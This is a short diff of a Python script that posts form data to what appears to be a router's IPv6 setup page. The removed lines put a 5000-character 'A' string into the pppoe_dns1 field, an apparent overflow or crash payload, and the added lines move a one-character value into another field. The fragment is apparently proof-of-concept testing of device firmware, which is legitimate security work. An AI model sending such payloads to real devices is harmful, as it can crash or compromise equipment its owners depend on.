@@ -35,8 +35,8 @@ headers = {
 	"Priority": "u=4",
 }
 
-repeated = "A"*5000
-data = "submit-url=%2FIPv6_Setup.htm&update=&wan_enable=1&OriginType=0&enable_dhcpv6RapidCommit=1&&pppoe_dns1={}".format (repeated)
+repeated = "A"
+data = "submit-url=%2FIPv6_Setup.htm&update=&wan_enable=1&OriginType=0&enable_dhcpv6RapidCommit={}".format (repeated)
 
 response = requests.post (url, data=data, headers=headers,verify=False)
 print ("nmap... ...")
